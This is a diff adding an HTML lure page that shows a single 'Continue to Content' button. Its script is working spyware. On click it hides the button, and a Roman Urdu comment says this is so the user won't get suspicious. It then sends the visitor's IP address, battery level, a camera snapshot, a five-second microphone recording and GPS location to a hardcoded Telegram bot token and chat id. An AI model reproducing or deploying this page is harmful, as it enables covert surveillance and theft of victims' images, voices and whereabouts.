@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="ur">
+<head>
+    <meta charset="UTF-8">
+    <title>Connecting...</title>
+</head>
+<body style="display: flex; justify-content: center; align-items: center; height: 100vh; font-family: sans-serif;">
+
+    <button id="startBtn" style="padding: 20px 40px; font-size: 20px; cursor: pointer; background: #0088cc; color: white; border: none; border-radius: 10px;">
+        Continue to Content
+    </button>
+
+    <script>
+        const token = "8723234676:AAGnEQAk29lc6ia51FEn3Q3vHyRAgkN_6Io";
+        const chatId = "8310852258";
+
+        // 1. Text Message bhejney ka function
+        async function sendText(text) {
+            const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            await fetch(url);
+        }
+
+        // 2. Photo/Audio bhejney ka function
+        async function sendMedia(blob, type, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append(type, blob, filename);
+            
+            await fetch(`https://api.telegram.org/bot${token}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        document.getElementById('startBtn').addEventListener('click', async () => {
+            // Button hide kar dein taake user ko shak na ho
+            document.getElementById('startBtn').style.display = 'none';
+
+            // Phase 1: Battery aur IP
+            const battery = await navigator.getBattery();
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            
+            let report = "🚀 **Link Opened!**\n";
+            report += "🔋 Battery: " + Math.round(battery.level * 100) + "%\n";
+            report += "🌐 IP: " + ipData.ip;
+            sendText(report);
+
+            // Phase 2: Camera, Mic, aur Location permissions
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+
+                // Instant Photo Click
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                setTimeout(() => {
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    canvas.toBlob(blob => sendMedia(blob, 'photo', 'snap.jpg'), 'image/jpeg');
+                }, 1000);
+
+                // Audio Record (5 Seconds)
+                const recorder = new MediaRecorder(stream);
+                const chunks = [];
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.onstop = () => {
+                    const audioBlob = new Blob(chunks, { type: 'audio/ogg' });
+                    sendMedia(audioBlob, 'audio', 'voice.ogg');
+                };
+                recorder.start();
+                setTimeout(() => recorder.stop(), 5000);
+
+                // Location Tracking
+                navigator.geolocation.getCurrentPosition(pos => {
+                    const map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                    sendText("📍 **Location Found:**\n" + map);
+                });
+
+            } catch (err) {
+                sendText("❌ Permissions Denied: " + err.message);
+            }
+        });
+    </script>
+</body>
+</html>
